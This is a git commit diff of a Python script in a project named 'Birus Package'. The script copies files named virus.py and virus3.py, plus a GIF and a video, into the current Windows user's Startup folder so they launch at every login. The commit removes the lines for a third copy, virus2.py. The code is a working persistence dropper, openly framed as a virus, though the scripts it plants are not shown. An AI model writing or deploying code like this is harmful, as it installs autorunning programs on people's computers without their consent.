7bf4265bc6020e2df2824acc68abe2f83798e385
JigTheFig <51309806+JigTheFig@users.noreply.github.com>
2020-08-21 14:42:08 +1000

    Update app.py

--- Birus Package/app.py
+++ Birus Package/app.py
@@ -1,12 +1,10 @@
 import os
 import shutil
 thicc = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','virus.py')
-thicc2 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','virus2.py')
 thicc3 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','henrystickmin.gif')
 thicc4 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','chungus.mp4')
 thicc5 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','virus3.py')
 shutil.copy('Framework1.py',thicc)
-shutil.copy('Framework2.py',thicc2)
 shutil.copy('chungus.mp4',thicc4)
 shutil.copy('henrystickmin.gif',thicc3)
 shutil.copy('Framework 3.py',thicc5)
